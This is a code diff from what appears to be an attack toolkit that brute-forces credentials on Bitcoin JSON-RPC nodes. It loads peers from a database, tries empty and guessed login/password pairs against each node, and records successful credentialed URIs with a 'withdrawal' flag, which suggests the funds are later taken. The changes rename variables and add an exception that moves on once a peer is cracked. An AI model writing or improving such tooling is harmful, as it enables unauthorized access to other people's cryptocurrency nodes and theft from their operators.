@@ -11,7 +11,7 @@ from aiobitcoin.grambitcoin import GramBitcoin
 from aiobitcoin.blockchain import Blockchain
 from aiobitcoin import bitcoinerrors
 
-from src.extra import utils
+from src.extra import utils, toolkitexceptions
 from src.extra.pymongodb import PyMongoDB
 from src.extra.aiomotor import AIOMotor
 
@@ -173,35 +173,37 @@ class EmptyCredentialsChecker(BruterBase):
         login, pwd = utils.del_spec_chars_from_strings(login, pwd)
         return f'http://{login}:{pwd}@{host}'
 
-    async def _uri_handler(self, host, login, pwd):
+    async def _uri_handler(self, uri, login, pwd):
         if login and pwd:
-            uri = await self._get_uri_with_creds(host.split('//')[1], login, pwd)
+            new_uri = await self._get_uri_with_creds(uri.split('//')[1], login, pwd)
         else:
-            uri = host
+            new_uri = uri
 
-        return uri
+        return new_uri
 
-    async def bruteforce(self, host, login=None, password=None, gram=None):
-        uri = await self._uri_handler(host, login, password)
-        blockchain = Blockchain(url=uri, gram=gram, read_timeout=self._read_timeout)
+    async def bruteforce(self, uri, login=None, password=None, gram=None):
+        new_uri = await self._uri_handler(uri, login, password)
+        blockchain = Blockchain(url=new_uri, gram=gram, read_timeout=self._read_timeout)
 
         try:
             await asyncio.wait_for(blockchain.get_difficulty(), self._wait_timeout)
         except bitcoinerrors.IncorrectCreds:
             pass
         except bitcoinerrors.NoConnectionToTheDaemon:
-            await self._update_brute_status(host, 'NoConnectionToTheDaemon')
+            await self._update_brute_status(uri, 'NoConnectionToTheDaemon')
             raise
         except asyncio.futures.TimeoutError:
-            await self._update_brute_status(host, 'TimeoutError')
+            await self._update_brute_status(uri, 'TimeoutError')
             raise
         else:
-            await self._make_record(uri=uri, withdrawal=False)
-            await self._update_brute_status(host, True)
+            await self._make_record(uri=new_uri, withdrawal=False)
+            await self._update_brute_status(uri, True)
+
+            raise toolkitexceptions.PeerWasBruted
 
     async def _checker_handler(self, non_checked_peers, grams):
         await asyncio.gather(
-            *(self.bruteforce(peer, gram=gram) for peer, gram in zip(non_checked_peers, grams))
+            *(self.bruteforce(uri, gram=gram) for uri, gram in zip(non_checked_peers, grams))
         )
 
     @property
@@ -214,7 +216,11 @@ class EmptyCredentialsChecker(BruterBase):
     async def _run_check_empty_by_block(self, grams):
         for point in range(0, self._peers_count, self.num_threads):
             non_checked_peers = self.get_peers_from_db(point, self.num_threads)
-            await self._checker_handler(non_checked_peers, grams)
+
+            try:
+                await self._checker_handler(non_checked_peers, grams)
+            except toolkitexceptions.PeerWasBruted:
+                pass
 
         return True
 
@@ -264,7 +270,9 @@ class JSONRPCBruter(EmptyCredentialsChecker):
 
             try:
                 await self._run_bruteforce_by_block(grams)
-            except (bitcoinerrors.NoConnectionToTheDaemon, asyncio.futures.TimeoutError):
+            except (bitcoinerrors.NoConnectionToTheDaemon,
+                    asyncio.futures.TimeoutError,
+                    toolkitexceptions.PeerWasBruted):
                 continue
             finally:
                 await self.close_gram_sessions(grams)
